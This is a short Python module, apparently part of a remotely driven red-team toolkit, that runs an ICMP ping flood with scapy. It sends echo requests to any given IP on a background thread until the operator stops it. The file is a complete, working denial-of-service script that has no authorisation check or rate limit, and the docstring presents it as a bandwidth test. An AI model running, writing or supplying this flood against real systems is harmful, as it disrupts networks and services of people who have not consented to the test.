import threading
from scapy.all import send, conf
from scapy.layers.inet import IP, ICMP
from Server.core.remote_output import remote_print

def start_icmp_flood(target_ip: str, iface: str = None):
    """
    Floods a target IP with ICMP Echo Request packets (Ping flood)
    to test network bandwidth and layer 3 packet-processing saturation.
    """
    target_iface = iface or conf.iface
    remote_print(f"[RED] Starting ICMP Ping Flood against {target_ip}...")

    is_running = True

    def flood_loop():
        while is_running:
            try:
                # Build ICMP Echo Request (type 8)
                pkt = IP(dst=target_ip) / ICMP(type=8)
                send(pkt, iface=target_iface, verbose=False)
            except Exception:
                pass

    # Launch worker thread
    worker = threading.Thread(target=flood_loop, daemon=True)
    worker.start()

    input("Press Enter to stop ICMP Flood...\n")
    is_running = False
    remote_print("[+] ICMP Flood stopped.")